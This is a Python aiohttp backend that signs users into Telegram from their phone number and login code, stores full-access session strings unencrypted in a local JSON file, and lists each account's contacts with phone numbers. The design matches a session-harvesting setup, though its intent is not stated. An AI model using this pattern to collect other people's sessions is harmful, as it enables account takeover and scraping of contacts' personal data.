import os
import asyncio
import json
import logging
from pathlib import Path
from aiohttp import web
from telethon import TelegramClient
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("telegram-auth-server")

API_ID = os.getenv("TELEGRAM_API_ID", "")
API_HASH = os.getenv("TELEGRAM_API_HASH", "")

SESSIONS_FILE = "sessions.json"
PORT = int(os.getenv("PORT", "8080"))

sessions = {}

def load_sessions():
    if Path(SESSIONS_FILE).exists():
        with open(SESSIONS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_sessions(data):
    with open(SESSIONS_FILE, "w") as f:
        json.dump(data, f)

async def index(request):
    return web.FileResponse(Path("web") / "index.html")

async def api_status(request):
    return web.json_response({"status": "online", "timestamp": asyncio.get_event_loop().time()})

async def send_code(request):
    global sessions
    try:
        data = await request.json()
        phone = data.get("phone", "").strip()
        
        if not phone:
            return web.json_response({"error": "Номер телефона обязателен"}, status=400)
        
        if not phone.startswith("+"):
            phone = "+" + phone
        
        api_id = data.get("api_id") or API_ID
        api_hash = data.get("api_hash") or API_HASH
        
        if not api_id or not api_hash:
            return web.json_response({"error": "API_ID и API_HASH обязательны"}, status=400)
        
        client = TelegramClient(StringSession(), int(api_id), api_hash)
        await client.connect()
        
        sent = await client.send_code_request(phone)
        
        sessions[phone] = {
            "api_id": api_id,
            "api_hash": api_hash,
            "phone_code_hash": sent.phone_code_hash,
            "client": client
        }
        
        await client.disconnect()
        
        return web.json_response({
            "success": True,
            "phone": phone,
            "phone_code_hash": sent.phone_code_hash,
            "message": "Код отправлен в Telegram"
        })
        
    except Exception as e:
        logger.error(f"Send code error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def verify_code(request):
    global sessions
    try:
        data = await request.json()
        phone = data.get("phone", "").strip()
        code = data.get("code", "").strip()
        
        if not phone or not code:
            return web.json_response({"error": "Номер и код обязательны"}, status=400)
        
        if not phone.startswith("+"):
            phone = "+" + phone
        
        if phone not in sessions:
            return web.json_response({"error": "Сессия не найдена. Сначала запросите код."}, status=400)
        
        session_data = sessions[phone]
        api_id = session_data["api_id"]
        api_hash = session_data["api_hash"]
        phone_code_hash = session_data["phone_code_hash"]
        
        client = TelegramClient(StringSession(), int(api_id), api_hash)
        await client.connect()
        
        try:
            user = await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            session_string = client.session.save()
            
            all_sessions = load_sessions()
            all_sessions[phone] = {
                "session": session_string,
                "user_id": user.id,
                "username": getattr(user, "username", None),
                "first_name": user.first_name,
                "last_name": getattr(user, "last_name", None)
            }
            save_sessions(all_sessions)
            
            await client.disconnect()
            del sessions[phone]
            
            return web.json_response({
                "success": True,
                "user": {
                    "id": user.id,
                    "username": getattr(user, "username", None),
                    "first_name": user.first_name,
                    "last_name": getattr(user, "last_name", None)
                },
                "session": session_string
            })
            
        except Exception as e:
            await client.disconnect()
            logger.error(f"Sign in error: {e}")
            return web.json_response({"error": str(e)}, status=400)
            
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def get_contacts(request):
    try:
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return web.json_response({"error": "Требуется авторизация"}, status=401)
        
        session_string = auth_header.replace("Bearer ", "")
        
        all_sessions = load_sessions()
        phone = None
        for p, s in all_sessions.items():
            if s.get("session") == session_string:
                phone = p
                break
        
        if not phone:
            return web.json_response({"error": "Сессия не найдена"}, status=401)
        
        session_data = all_sessions[phone]
        client = TelegramClient(StringSession(session_data["session"]), int(session_data.get("api_id", API_ID)), session_data.get("api_hash", API_HASH))
        await client.connect()
        
        contacts = []
        async for dialog in client.iter_dialogs():
            if hasattr(dialog.entity, 'phone'):
                contacts.append({
                    "id": dialog.entity.id,
                    "name": dialog.name,
                    "phone": dialog.entity.phone,
                    "username": getattr(dialog.entity, 'username', None)
                })
        
        await client.disconnect()
        return web.json_response({"contacts": contacts})
        
    except Exception as e:
        logger.error(f"Contacts error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def logout(request):
    try:
        data = await request.json()
        session_string = data.get("session")
        
        all_sessions = load_sessions()
        for phone, s in list(all_sessions.items()):
            if s.get("session") == session_string:
                del all_sessions[phone]
                save_sessions(all_sessions)
                break
        
        return web.json_response({"success": True})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

app = web.Application()
app.router.add_get("/", index)
app.router.add_get("/api/status", api_status)
app.router.add_post("/api/auth/send-code", send_code)
app.router.add_post("/api/auth/verify-code", verify_code)
app.router.add_get("/api/contacts", get_contacts)
app.router.add_post("/api/auth/logout", logout)

if __name__ == "__main__":
    logger.info(f"Сервер запущен на порту {PORT}")
    web.run_app(app, host="0.0.0.0", port=PORT)